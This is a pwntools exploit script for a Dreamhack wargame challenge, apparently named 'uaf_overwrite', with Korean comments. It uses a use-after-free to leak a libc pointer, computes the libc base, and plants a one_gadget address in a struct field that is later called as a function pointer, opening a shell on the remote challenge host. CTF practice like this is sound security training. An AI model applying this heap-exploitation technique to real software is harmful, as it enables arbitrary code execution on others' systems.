from pwn import *

DUMMY_DATA = 'A'
OFFSET = 0x3ebca0
ONE_GADGET = 0x10a41c

# p = process('uaf_overwrite', env= {"LD_PRELOAD" : "libc-2.27.so"})
# p = process('a.out', env= {"LD_PRELOAD" : "libc-2.27.so"})
p = remote('host3.dreamhack.games', "22244")

# alloc1
p.sendlineafter(b"> ", b'3')
p.sendlineafter(b"Size:", b'1280')
p.sendafter(b"Data:", DUMMY_DATA.encode())
p.sendlineafter(b"idx:", b'-1')

# alloc2 & free alloc1
p.sendlineafter(b"> ", b'3')
p.sendlineafter(b"Size:", b'1280')
p.sendafter(b"Data:", DUMMY_DATA.encode())
p.sendlineafter(b"idx:", b'0')

# alloc 3 (reuse chunk of 'alloc1')
p.sendlineafter(b"> ", b'3')
p.sendlineafter(b"Size:", b'1280')
p.sendafter(b"Data:", DUMMY_DATA.encode())

p.recvuntil(b'Data: ')
fd = (p.recvline()[:-1].ljust(8, b'\x00'))  # fd 값 추출
fd = u64(fd)

p.sendlineafter(b"idx:", b'-1') # 잔여 과정 처리

print('fd:', hex(fd))
offset = OFFSET + ord(DUMMY_DATA) - (OFFSET&0xFF)  # 덮어쓴 DUMMY_DATA값을 고려하여 계산한다.
print('offset:', hex(offset))
libc_base = fd - offset  # 유출된 fd 값으로 libc_base 값 계산
print('libc_base:', hex(libc_base))
gadget = libc_base + ONE_GADGET 
print('gadget:', hex(gadget))

# alloc struct1
p.sendlineafter(b"> ", b'1')
p.sendlineafter(b"Weight:", b'1')
p.sendlineafter(b"Age:", str(gadget).encode())  # 특정 구역에 gadget 주입

# alloc struct2
p.sendlineafter(b"> ", b'2')
p.sendlineafter(b"Weight:", b'1')
# struct1 의 Age 영역이 strucut2 구역서는 함수 포인터이다. 아까 주입한 gadget 이 실행된다.

p.interactive()


